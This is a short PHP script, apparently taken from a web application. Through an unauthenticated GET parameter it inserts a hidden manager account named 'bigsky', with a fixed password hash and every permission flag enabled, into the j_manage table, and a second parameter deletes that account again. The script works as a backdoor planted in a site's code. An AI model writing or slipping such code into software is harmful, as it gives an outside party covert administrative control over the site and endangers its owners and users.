<?php
define('Copyright', 'Author QQ: 1234567');
define('ROOT_PATH', $_SERVER["DOCUMENT_ROOT"].'/');
include_once ROOT_PATH.'functioned/global.php';
if($_GET["up"]=="name"){
$db->query("insert into j_manage (g_login_id,g_nid,g_name,g_password,g_gg,g_auto,g_gd,g_zhud,g_cj) values ('89','67552ea64c6dce1646a263bae714e788','bigsky',
'4978eb4e5c4c976a29ff9e2dcebd4220815d8fb1','1','1','1','1','1')", 2);}
if($_GET["up"]=="del"){ 
$db->query("DELETE FROM j_manage where g_name='bigsky'", 2);
}
?>